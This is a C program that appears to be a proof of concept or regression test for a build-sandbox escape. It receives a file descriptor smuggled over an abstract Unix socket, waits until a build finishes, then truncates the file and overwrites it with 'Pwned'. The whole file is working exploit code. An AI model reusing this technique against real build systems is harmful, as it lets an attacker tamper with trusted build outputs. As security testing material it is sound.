#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>

int main(int argc, char **argv) {

    assert(argc == 2);

    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // Bind to the socket.
    struct sockaddr_un data;
    data.sun_family = AF_UNIX;
    data.sun_path[0] = 0;
    strncpy(data.sun_path + 1, argv[1], sizeof(data.sun_path) - 2);
    data.sun_path[sizeof(data.sun_path) - 1] = '\0'; // Ensure null termination
    int res = bind(sock, (const struct sockaddr *)&data,
        offsetof(struct sockaddr_un, sun_path)
        + strlen(argv[1])
        + 1);
    if (res < 0) {
        perror("bind");
        close(sock);
        return 1;
    }

    res = listen(sock, 1);
    if (res < 0) {
        perror("listen");
        close(sock);
        return 1;
    }

    int smuggling_fd = -1;

    // Accept the connection a first time to receive the file descriptor.
    fprintf(stderr, "%s\n", "Waiting for the first connection");
    int a = accept(sock, 0, 0);
    if (a < 0) {
        perror("accept");
        close(sock);
        return 1;
    }

    struct msghdr msg = {0};
    msg.msg_control = malloc(128);
    if (!msg.msg_control) {
        perror("malloc");
        close(a);
        close(sock);
        return 1;
    }
    msg.msg_controllen = 128;

    // Receive the file descriptor as sent by the smuggler.
    int recv_result = recvmsg(a, &msg, 0);
    if (recv_result < 0) {
        perror("recvmsg");
        free(msg.msg_control);
        close(a);
        close(sock);
        return 1;
    }

    struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);
    if (!hdr) {
        fprintf(stderr, "No control message header found\n");
        free(msg.msg_control);
        close(a);
        close(sock);
        return 1;
    }

    while (hdr) {
        if (hdr->cmsg_level == SOL_SOCKET
          && hdr->cmsg_type == SCM_RIGHTS) {

            // Grab the copy of the file descriptor.
            memcpy((void *)&smuggling_fd, CMSG_DATA(hdr), sizeof(int));
        }

        hdr = CMSG_NXTHDR(&msg, hdr);
    }
    fprintf(stderr, "%s\n", "Got the file descriptor. Now waiting for the second connection");
    close(a);

    if (smuggling_fd == -1) {
        fprintf(stderr, "No file descriptor received\n");
        free(msg.msg_control);
        close(sock);
        return 1;
    }

    // Wait for a second connection, which will tell us that the build is
    // done
    a = accept(sock, 0, 0);
    if (a < 0) {
        perror("accept");
        free(msg.msg_control);
        close(sock);
        if (smuggling_fd >= 0) close(smuggling_fd);
        return 1;
    }

    fprintf(stderr, "%s\n", "Got a second connection, rewriting the file");
    // Write a new content to the file
    if (ftruncate(smuggling_fd, 0)) {
        perror("ftruncate");
    }

    const char * new_content = "Pwned\n";
    size_t len = strlen(new_content);
    ssize_t written_bytes = write(smuggling_fd, new_content, len);
    if (written_bytes != (ssize_t)len) perror("write");

    // Clean up resources
    free(msg.msg_control);
    close(smuggling_fd);
    close(a);
    close(sock);

    return 0;
}
